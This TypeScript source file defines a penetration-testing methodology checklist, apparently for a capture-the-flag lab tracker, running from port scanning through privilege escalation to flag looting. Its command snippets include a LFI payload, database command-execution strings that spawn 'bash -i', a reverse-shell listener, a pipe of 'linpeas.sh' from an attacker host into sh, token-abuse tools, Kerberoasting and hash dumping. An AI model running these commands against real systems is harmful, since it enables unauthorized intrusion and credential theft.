import { MethodologyPhase, ServiceBranchType, ChecklistItem } from '../types/checklist';
import { Machine } from '../types';

export interface ServiceBranchDefinition {
  type: ServiceBranchType;
  name: string;
  defaultPorts: number[];
  description: string;
}

export const SERVICE_BRANCHES: ServiceBranchDefinition[] = [
  {
    type: 'web',
    name: 'Branch A: HTTP / HTTPS / Web Apps',
    defaultPorts: [80, 443, 8000, 8080, 8443, 8888, 3000, 5000, 9000],
    description: 'Web servers, APIs, reverse proxies, and CMS platforms.',
  },
  {
    type: 'file_sharing',
    name: 'Branch B: File Sharing & Infra (SMB, FTP, NFS, RPC)',
    defaultPorts: [21, 135, 139, 445, 2049],
    description: 'Network shares, anonymous access, and RPC directory enumeration.',
  },
  {
    type: 'remote_access',
    name: 'Branch C: Remote Access (SSH, RDP, WinRM, VNC)',
    defaultPorts: [22, 3389, 5985, 5986, 5900],
    description: 'Administrative command interfaces and remote desktop services.',
  },
  {
    type: 'database',
    name: 'Branch D: Database Engines',
    defaultPorts: [1433, 1521, 3306, 5432, 6379, 27017],
    description: 'Relational & NoSQL database management systems.',
  },
  {
    type: 'network_mgmt',
    name: 'Branch E: Network Mgmt & Discovery (DNS, SNMP, LDAP)',
    defaultPorts: [53, 161, 389, 636, 88],
    description: 'Name resolution, network monitoring, and directory service endpoints.',
  },
  {
    type: 'linux_privesc',
    name: 'Branch F: Linux Privilege Escalation Playbook',
    defaultPorts: [],
    description: 'SUID, sudo rights, capabilities, cron, and kernel vectors on Linux.',
  },
  {
    type: 'windows_privesc',
    name: 'Branch G: Windows & Active Directory PrivEsc Playbook',
    defaultPorts: [],
    description: 'Token impersonation, services, DPAPI, and Kerberos abuse.',
  },
];

export const MASTER_METHODOLOGY_FRAMEWORK: MethodologyPhase[] = [
  // =================== PHASE 01 ===================
  {
    phaseNumber: 1,
    id: 'phase-01-surface-mapping',
    title: 'Phase 01: Host Discovery & Surface Mapping',
    subtitle: 'Reconnaissance & Port Sweep',
    description: 'Scan the target host across TCP and UDP ports, detect open services, and fingerprint the underlying operating system.',
    subcategories: [
      {
        id: 'surface-port-scanning',
        title: 'Port Scanning & Host Discovery',
        serviceBranch: 'universal',
        items: [
          {
            id: 'p01-fast-syn',
            title: 'Fast SYN Scan (Top 1000 TCP Ports)',
            commandSnippet: 'nmap -sC -sV -Pn --min-rate 2000 -oN nmap_quick.txt {TARGET_IP}',
            description: 'Quick sweep of common TCP ports with default scripts and service versions.',
          },
          {
            id: 'p01-full-tcp',
            title: 'Full 65,535 TCP Exhaustive Port Sweep',
            commandSnippet: 'nmap -p- -sC -sV -Pn --min-rate 3000 -oA nmap_full {TARGET_IP}',
            description: 'Ensure no non-standard or high-numbered services (e.g. 8080, 8443, 9001) are missed.',
          },
          {
            id: 'p01-udp-top',
            title: 'Top UDP Service Discovery Scan',
            commandSnippet: 'sudo nmap -sU --top-ports 100 -Pn --open -oN nmap_udp.txt {TARGET_IP}',
            description: 'Probe high-value UDP targets including SNMP, DNS, TFTP, and NTP.',
          },
          {
            id: 'p01-os-fingerprint',
            title: 'OS Fingerprinting & TCP/IP Stack Analysis',
            commandSnippet: 'nmap -O --osscan-guess {TARGET_IP}',
            description: 'Determine exact kernel/OS flavor (Linux distro, Windows build, BSD).',
          },
        ],
      },
    ],
  },

  // =================== PHASE 02 ===================
  {
    phaseNumber: 2,
    id: 'phase-02-service-enumeration',
    title: 'Phase 02: Protocol & Service Enumeration',
    subtitle: 'Deep Non-Exploitative Service Inspection',
    description: 'Deeply inspect every discovered service without active exploitation, identifying versions, endpoints, and misconfigurations.',
    subcategories: [
      // Universal Service Enum
      {
        id: 'p02-universal-matrix',
        title: 'Universal Service Version Matrix',
        serviceBranch: 'universal',
        items: [
          {
            id: 'p02-banner-grab',
            title: 'Banner Grabbing & Service Response Check',
            commandSnippet: 'nc -nv {TARGET_IP} {PORT} or curl -I http://{TARGET_IP}:{PORT}',
            description: 'Read raw banners on all open ports to identify unmasked daemons.',
          },
          {
            id: 'p02-nse-scripts',
            title: 'Nmap Safe NSE Service-Specific Scripts',
            commandSnippet: 'nmap -sC --script "safe and discovery" -p {PORT} {TARGET_IP}',
            description: 'Gather verbose capabilities without triggering active exploits.',
          },
        ],
      },

      // Branch A: Web
      {
        id: 'p02-branch-web',
        title: 'Branch A: HTTP / HTTPS Web Surface Inspection',
        serviceBranch: 'web',
        requiredPorts: [80, 443, 8000, 8080, 8443, 8888, 3000, 5000],
        items: [
          {
            id: 'p02-web-tech-stack',
            title: 'Technology Stack Fingerprinting (WhatWeb, Wappalyzer)',
            commandSnippet: 'whatweb -a 3 http://{TARGET_IP}/',
            description: 'Detect web server, CMS, programming framework (PHP, Node, Django), and proxy headers.',
          },
          {
            id: 'p02-web-metadata-source',
            title: 'Source Code, Comments & Metadata Inspection',
            commandSnippet: 'curl -s http://{TARGET_IP}/ | grep -E "<!--|TODO|DEBUG|api"',
            description: 'Check HTML comments, developer notes, /robots.txt, /sitemap.xml, and exposed .git/.env.',
          },
          {
            id: 'p02-web-vhosts',
            title: 'Virtual Host & Subdomain Enumeration',
            commandSnippet: 'ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://{TARGET_IP}/ -H "Host: FUZZ.{TARGET_DOMAIN}" -mc 200,301,302 -fs {BASELINE_SIZE}',
            description: 'Discover hidden virtual hosts routed on the same IP.',
          },
          {
            id: 'p02-web-dir-fuzz',
            title: 'Recursive Directory & Endpoint Fuzzing',
            commandSnippet: 'ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://{TARGET_IP}/FUZZ -e .php,.txt,.bak,.json,.sh -ac',
            description: 'Identify hidden administrative panels, upload directories, API routes, and backups.',
          },
          {
            id: 'p02-web-api-routes',
            title: 'API & Modern Framework Assessment (REST/GraphQL)',
            commandSnippet: 'curl -s -X POST http://{TARGET_IP}/graphql -H "Content-Type: application/json" -d \'{"query": "{__schema{types{name}}}"}\'',
            description: 'Test for GraphQL introspection or OpenAPI / Swagger endpoints at /api, /swagger, /docs.',
          },
        ],
      },

      // Branch B: File Sharing
      {
        id: 'p02-branch-file-sharing',
        title: 'Branch B: File Sharing & Infrastructure (SMB, FTP, NFS, RPC)',
        serviceBranch: 'file_sharing',
        requiredPorts: [21, 135, 139, 445, 2049],
        items: [
          {
            id: 'p02-ftp-anonymous',
            title: 'FTP Anonymous Login & File Retrieval',
            commandSnippet: 'ftp -n {TARGET_IP} <<<\'user anonymous ""\'',
            description: 'Check if anonymous FTP login is allowed and download all readable files.',
          },
          {
            id: 'p02-smb-shares',
            title: 'SMB NULL / Guest Session & Share Permissions',
            commandSnippet: 'netexec smb {TARGET_IP} -u "" -p "" --shares or smbclient -N -L //{TARGET_IP}/',
            description: 'Verify read/write permissions on public, IPC$, and hidden shares.',
          },
          {
            id: 'p02-nfs-exports',
            title: 'NFS Public Export Mounts Inspection',
            commandSnippet: 'showmount -e {TARGET_IP}',
            description: 'Check for NFS exports mountable without authentication or with no_root_squash.',
          },
          {
            id: 'p02-rpc-enum',
            title: 'RPC User & Group Domain Enumeration',
            commandSnippet: 'rpcclient -U "" -N {TARGET_IP} -c "enumdomusers; enumdomgroups"',
            description: 'Query users, groups, and domain info through unauthenticated MSRPC.',
          },
        ],
      },

      // Branch C: Remote Access
      {
        id: 'p02-branch-remote-access',
        title: 'Branch C: Remote Access & Administration (SSH, RDP, WinRM)',
        serviceBranch: 'remote_access',
        requiredPorts: [22, 3389, 5985, 5986, 5900],
        items: [
          {
            id: 'p02-ssh-banner',
            title: 'SSH Banner & Algorithm Audit',
            commandSnippet: 'nc -nv {TARGET_IP} 22 or ssh -v {TARGET_IP}',
            description: 'Check exact OpenSSH version for known vulnerabilities or weak auth methods.',
          },
          {
            id: 'p02-rdp-winrm-status',
            title: 'RDP / WinRM Service Handshake Inspection',
            commandSnippet: 'nxc winrm {TARGET_IP} or nxc rdp {TARGET_IP}',
            description: 'Verify WinRM authentication status and RDP NLA encryption settings.',
          },
        ],
      },

      // Branch D: Databases
      {
        id: 'p02-branch-databases',
        title: 'Branch D: Database Engine Enumeration',
        serviceBranch: 'database',
        requiredPorts: [1433, 1521, 3306, 5432, 6379, 27017],
        items: [
          {
            id: 'p02-db-default-accounts',
            title: 'Database Default Credentials Check (sa, root, postgres)',
            commandSnippet: 'nxc mssql {TARGET_IP} -u sa -p "" or mysql -h {TARGET_IP} -u root',
            description: 'Test blank or default administrative passwords on exposed database ports.',
          },
          {
            id: 'p02-redis-unauth',
            title: 'Redis / MongoDB Unauthenticated Access',
            commandSnippet: 'redis-cli -h {TARGET_IP} info or mongosh --host {TARGET_IP}',
            description: 'Verify unauthenticated database commands, key inspection, or rogue module injection.',
          },
        ],
      },

      // Branch E: Network Management
      {
        id: 'p02-branch-net-mgmt',
        title: 'Branch E: Network Management & Discovery (DNS, SNMP, LDAP)',
        serviceBranch: 'network_mgmt',
        requiredPorts: [53, 161, 389, 636, 88],
        items: [
          {
            id: 'p02-dns-zone-transfer',
            title: 'DNS Zone Transfer (AXFR) Test',
            commandSnippet: 'dig axfr @{TARGET_IP} {DOMAIN}',
            description: 'Attempt full zone transfer to extract all internal domain hostnames.',
          },
          {
            id: 'p02-snmp-walk',
            title: 'SNMP Community String Fuzzing & Walk',
            commandSnippet: 'onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {TARGET_IP}; snmpwalk -c public -v2c {TARGET_IP}',
            description: 'Expose system processes, network interfaces, and potential credentials in SNMP OIDs.',
          },
          {
            id: 'p02-ldap-anonymous',
            title: 'LDAP Anonymous Bind & Active Directory Recon',
            commandSnippet: 'ldapsearch -x -H ldap://{TARGET_IP} -s base namingcontexts',
            description: 'Extract Active Directory domain naming contexts without credentials.',
          },
        ],
      },
    ],
  },

  // =================== PHASE 03 ===================
  {
    phaseNumber: 3,
    id: 'phase-03-threat-modeling',
    title: 'Phase 03: Vulnerability Identification & Threat Modeling',
    subtitle: 'CVE Correlation & Attack Surface Mapping',
    description: 'Correlate identified versions against public CVE databases, test authentication mechanisms, and map out viable exploitation chains.',
    subcategories: [
      {
        id: 'p03-vulnerability-correlation',
        title: 'Vulnerability Analysis & Misconfiguration Checks',
        serviceBranch: 'universal',
        items: [
          {
            id: 'p03-cve-search',
            title: 'Public CVE & Exploit-DB Search',
            commandSnippet: 'searchsploit {SERVICE_NAME} {VERSION}',
            description: 'Query local and remote exploit databases for published weaponized PoCs.',
          },
          {
            id: 'p03-default-creds',
            title: 'Default Credentials Verification on Management Consoles',
            commandSnippet: 'Testing admin:admin, admin:password, root:root, etc.',
            description: 'Check administrative dashboards, routers, Jenkins, Tomcat, and Webmin.',
          },
          {
            id: 'p03-web-auth-session',
            title: 'Branch A: Authentication & Session Analysis (JWT, IDOR, Cookies)',
            serviceBranch: 'web',
            commandSnippet: 'Inspect Set-Cookie, test JWT algorithm none / weak secret key',
            description: 'Examine authorization mechanisms for broken object-level access (IDOR) and weak tokens.',
          },
          {
            id: 'p03-smb-protocol-cves',
            title: 'Branch B: Known Protocol Flaws (MS17-010, SMBGhost, SambaCry)',
            serviceBranch: 'file_sharing',
            commandSnippet: 'nmap -p 445 --script smb-vuln-ms17-010 {TARGET_IP}',
            description: 'Verify presence of critical remote code execution vulnerabilities in SMB stack.',
          },
        ],
      },
    ],
  },

  // =================== PHASE 04 ===================
  {
    phaseNumber: 4,
    id: 'phase-04-initial-access',
    title: 'Phase 04: Foothold Execution & Initial Access',
    subtitle: 'Weaponization & Shell Acquisition',
    description: 'Deliver initial exploit payload, bypass security controls, and obtain a reliable remote command execution or reverse shell.',
    subcategories: [
      {
        id: 'p04-foothold-exploitation',
        title: 'Exploit Delivery & Reverse Shell Execution',
        serviceBranch: 'universal',
        items: [
          {
            id: 'p04-web-injection',
            title: 'Branch A: Web Injections (SQLi, SSTI, LFI Wrappers, Cmd Injection)',
            serviceBranch: 'web',
            commandSnippet: 'sqlmap -u "http://{TARGET_IP}/view?id=1" --batch --dbs or curl -s "http://{TARGET_IP}/?page=php://filter/convert.base64-encode/resource=config.php"',
            description: 'Exploit input validation flaws to retrieve database tables or read source code.',
          },
          {
            id: 'p04-web-upload-bypass',
            title: 'Branch A: File Upload Filter Bypass (Webshell Delivery)',
            serviceBranch: 'web',
            commandSnippet: 'Upload .phtml, .php5, .phar, double extension or Content-Type spoofing',
            description: 'Bypass file upload restrictions to write interactive webshell to webroot.',
          },
          {
            id: 'p04-db-oob-exec',
            title: 'Branch D: Out-of-Band Command Execution via Database',
            serviceBranch: 'database',
            commandSnippet: 'EXEC xp_cmdshell \'powershell ...\' or COPY table FROM PROGRAM \'bash -i ...\'',
            description: 'Leverage database administrative privileges to execute system commands.',
          },
          {
            id: 'p04-cred-access-remote',
            title: 'Branch C: Credential Validation & Remote Shell Connect',
            serviceBranch: 'remote_access',
            commandSnippet: 'ssh -i id_rsa user@{TARGET_IP} or evil-winrm -i {TARGET_IP} -u {USER} -p "{PASSWORD}"',
            description: 'Establish authenticated command session using discovered credentials or SSH keys.',
          },
          {
            id: 'p04-catch-revshell',
            title: 'Listener Setup & Reverse Shell Catch',
            commandSnippet: 'nc -lvnp {LPORT}',
            description: 'Prepare attacker listener and trigger reverse TCP socket callback.',
          },
        ],
      },
    ],
  },

  // =================== PHASE 05 ===================
  {
    phaseNumber: 5,
    id: 'phase-05-shell-stabilization',
    title: 'Phase 05: Shell Stabilization & Context Triage',
    subtitle: 'Interactive TTY & Environment Audit',
    description: 'Upgrade the raw socket into a full interactive TTY terminal, assess current user permissions, and verify sandbox or container constraints.',
    subcategories: [
      {
        id: 'p05-stabilization-triage',
        title: 'TTY Upgrade & Environment Triage',
        serviceBranch: 'universal',
        items: [
          {
            id: 'p05-tty-upgrade',
            title: 'Interactive TTY Upgrade (Python PTY / stty raw -echo)',
            commandSnippet: 'python3 -c \'import pty; pty.spawn("/bin/bash")\'\n# Ctrl+Z\nstty raw -echo; fg\nexport TERM=xterm-256color',
            description: 'Enable tab-completion, clear screen, arrow keys, and Ctrl+C interrupt handling.',
          },
          {
            id: 'p05-identity-privs',
            title: 'Identity & Privilege Context Inspection',
            commandSnippet: 'id; whoami; whoami /priv',
            description: 'Confirm current UID/GID, security groups, and enabled privileges.',
          },
          {
            id: 'p05-container-check',
            title: 'Container & Sandbox Detection (Docker / LXC / WSL)',
            commandSnippet: 'cat /proc/1/cgroup | grep docker; ls -la /.dockerenv',
            description: 'Verify whether access is restricted to a container environment requiring breakout.',
          },
          {
            id: 'p05-network-routing',
            title: 'Internal Network Interfaces & Routing Table',
            commandSnippet: 'ip a or ifconfig; ip route or route print',
            description: 'Detect secondary subnets, internal VLANs, and loopback adapters.',
          },
        ],
      },
    ],
  },

  // =================== PHASE 06 ===================
  {
    phaseNumber: 6,
    id: 'phase-06-internal-recon',
    title: 'Phase 06: Internal System & Network Reconnaissance',
    subtitle: 'Automated Enumeration & Artifact Discovery',
    description: 'Run automated internal audit scripts, search for unquoted paths, crontabs, internal sockets, and scavenge plain-text credentials.',
    subcategories: [
      {
        id: 'p06-internal-recon-checks',
        title: 'Local Discovery & Credential Hunting',
        serviceBranch: 'universal',
        items: [
          {
            id: 'p06-automated-script',
            title: 'Automated Enumeration Script Execution (LinPEAS / WinPEAS)',
            commandSnippet: 'curl -L http://{LHOST}:8000/linpeas.sh | sh or .\\winPEASany.exe',
            description: 'Highlight high-probability privilege escalation vectors in color-coded audit output.',
          },
          {
            id: 'p06-internal-ports',
            title: 'Internal Loopback Services & Listening Sockets',
            commandSnippet: 'ss -tulpn | grep LISTEN or netstat -ano | findstr LISTENING',
            description: 'Locate local-only HTTP services, internal databases, or debugging ports on 127.0.0.1.',
          },
          {
            id: 'p06-scheduled-tasks',
            title: 'Process Monitoring & Scheduled Jobs',
            commandSnippet: 'cat /etc/crontab /etc/cron.*/* or schtasks /query /fo LIST /v',
            description: 'Inspect recurring tasks running as root or administrative service accounts.',
          },
          {
            id: 'p06-credential-scavenge',
            title: 'Credential Scavenging in Configs, Backups & Histories',
            commandSnippet: 'grep -rnwi "password" /var/www/ 2>/dev/null or history | tail -n 50',
            description: 'Check web database credentials (wp-config.php, .env), bash history, and KeePass databases.',
          },
        ],
      },
    ],
  },

  // =================== PHASE 07 ===================
  {
    phaseNumber: 7,
    id: 'phase-07-privilege-escalation',
    title: 'Phase 07: Privilege Escalation & Lateral Movement',
    subtitle: 'Gaining Root / SYSTEM Privileges',
    description: 'Exploit system misconfigurations, abuse Active Directory access rights, or escalate privileges to achieve full administrative control.',
    subcategories: [
      // Branch F: Linux PrivEsc
      {
        id: 'p07-branch-linux-privesc',
        title: 'Branch F: Linux Privilege Escalation Playbook',
        serviceBranch: 'linux_privesc',
        requiredOs: ['Linux', 'BSD', 'Android'],
        items: [
          {
            id: 'p07-linux-sudo',
            title: 'Sudo Capabilities & Permissions Check (sudo -l)',
            commandSnippet: 'sudo -l',
            description: 'Check binaries allowed to run as root with or without password; cross-reference GTFOBins.',
          },
          {
            id: 'p07-linux-suid',
            title: 'SUID / SGID Binary Discovery & GTFOBins Exploitation',
            commandSnippet: 'find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \\;',
            description: 'Search for binaries running with root effective UID.',
          },
          {
            id: 'p07-linux-capabilities',
            title: 'Linux Binary Capabilities (getcap)',
            commandSnippet: 'getcap -r / 2>/dev/null',
            description: 'Audit dangerous capabilities like cap_setuid, cap_dac_read_search, or cap_sys_admin.',
          },
          {
            id: 'p07-linux-cron-abuse',
            title: 'Writable Cron Script or Wildcard Injection Abuse',
            commandSnippet: 'cat /etc/crontab; ps -ef | grep cron',
            description: 'Hijack cron scripts or exploit tar/rsync wildcard command execution.',
          },
          {
            id: 'p07-linux-sensitive-files',
            title: 'Writable Sensitive Files (/etc/passwd, /etc/shadow)',
            commandSnippet: 'ls -l /etc/passwd /etc/shadow',
            description: 'Write a new root user entry with custom crypted password hash if /etc/passwd is writable.',
          },
          {
            id: 'p07-linux-kernel',
            title: 'Kernel Exploitation (PwnKit, DirtyPipe) [Verified Option]',
            commandSnippet: 'uname -a',
            description: 'Cross-reference kernel release against stable local privilege escalation exploits.',
          },
        ],
      },

      // Branch G: Windows & AD PrivEsc
      {
        id: 'p07-branch-windows-privesc',
        title: 'Branch G: Windows & Active Directory PrivEsc Playbook',
        serviceBranch: 'windows_privesc',
        requiredOs: ['Windows'],
        items: [
          {
            id: 'p07-win-tokens',
            title: 'Token Privileges Abuse (SeImpersonate, SeBackupPrivilege)',
            commandSnippet: 'whoami /priv; GodPotato-NET4.exe -cmd "cmd.exe /c whoami"',
            description: 'Abuse impersonation privileges via PrintSpoofer, GodPotato, or JuicyPotato.',
          },
          {
            id: 'p07-win-stored-creds',
            title: 'Stored Credentials, DPAPI & Registry AutoLogon',
            commandSnippet: 'cmdkey /list or reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"',
            description: 'Extract saved RDP credentials, RunAs records, or plaintext autologon passwords.',
          },
          {
            id: 'p07-win-services',
            title: 'Service Exploitation (Unquoted Paths, Weak ACLs)',
            commandSnippet: 'wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\\Windows\\"',
            description: 'Replace writable binary paths or hijack unquoted executable spaces.',
          },
          {
            id: 'p07-ad-kerberoasting',
            title: 'Active Directory Kerberoasting & AS-REP Roasting',
            commandSnippet: 'impacket-GetUserSPNs {DOMAIN}/{USER}:{PASSWORD} -dc-ip {DC_IP} -request',
            description: 'Request service ticket TGS hashes and crack offline with hashcat.',
          },
          {
            id: 'p07-ad-bloodhound',
            title: 'BloodHound Path Exploration & Attack Chains',
            commandSnippet: '.\\SharpHound.exe -c All --zipfilename loot.zip',
            description: 'Collect domain graph and uncover shortest path to Domain Admins or DCSync rights.',
          },
        ],
      },
    ],
  },

  // =================== PHASE 08 ===================
  {
    phaseNumber: 8,
    id: 'phase-08-post-exploitation',
    title: 'Phase 08: Post-Exploitation, Flag Vault & Artifact Collection',
    subtitle: 'Root Looting & Documentation',
    description: 'Retrieve user and root flags, dump master password databases for credential reuse, clean all temporary files, and compile final writeup documentation.',
    subcategories: [
      {
        id: 'p08-loot-and-flags',
        title: 'Flag Looting & Evidence Archival',
        serviceBranch: 'universal',
        items: [
          {
            id: 'p08-extract-flags',
            title: 'Extract User Flag & Root/SYSTEM Flag',
            commandSnippet: 'cat /home/*/user.txt /root/root.txt or type C:\\Users\\*\\Desktop\\*flag.txt',
            description: 'Safely retrieve flags and copy directly into ZeroBox Flags Vault.',
          },
          {
            id: 'p08-dump-hashes',
            title: 'Credential & Hashdump Extraction (NTDS.dit / shadow)',
            commandSnippet: 'impacket-secretsdump {DOMAIN}/{ADMIN}@{TARGET_IP} or cat /etc/shadow',
            description: 'Extract password hashes for offline password recovery or credential stuffing in lab network.',
          },
          {
            id: 'p08-clean-artifacts',
            title: 'Cleanup Temporary Payloads & Tools',
            commandSnippet: 'rm -f /tmp/linpeas.sh /tmp/shell.elf C:\\Temp\\winpeas.exe',
            description: 'Remove uploaded exploitation binaries and restore original system state.',
          },
          {
            id: 'p08-writeup-sync',
            title: 'Document Full Kill-Chain in Writeup Studio',
            commandSnippet: 'Export checklist to Markdown and sync with Obsidian vault',
            description: 'Ensure all vulnerabilities, PoCs, and remediation suggestions are thoroughly preserved.',
          },
        ],
      },
    ],
  },
];

/**
 * Filter and generate applicable phases & subcategories based on machine OS and detected open ports.
 */
export function generateApplicablePhases(machine: Machine, openPorts: number[] = []): MethodologyPhase[] {
  const portsSet = new Set(openPorts);
  const isLinux = machine.os === 'Linux' || machine.os === 'BSD' || machine.os === 'Android';
  const isWindows = machine.os === 'Windows';

  return MASTER_METHODOLOGY_FRAMEWORK.map((phase) => {
    const applicableSubcategories = phase.subcategories.filter((subcat) => {
      // Universal subcategories always apply
      if (!subcat.serviceBranch || subcat.serviceBranch === 'universal') {
        return true;
      }

      // OS-specific checks
      if (subcat.serviceBranch === 'linux_privesc') {
        return isLinux;
      }
      if (subcat.serviceBranch === 'windows_privesc') {
        return isWindows;
      }

      // Port-specific branches: apply if ANY required port is open OR if no ports defined yet (show all as potential)
      if (portsSet.size === 0) {
        // If user hasn't added ports yet, show all branches so they can see full methodology
        return true;
      }

      if (subcat.requiredPorts && subcat.requiredPorts.length > 0) {
        return subcat.requiredPorts.some((p) => portsSet.has(p));
      }

      return true;
    });

    return {
      ...phase,
      subcategories: applicableSubcategories,
    };
  });
}
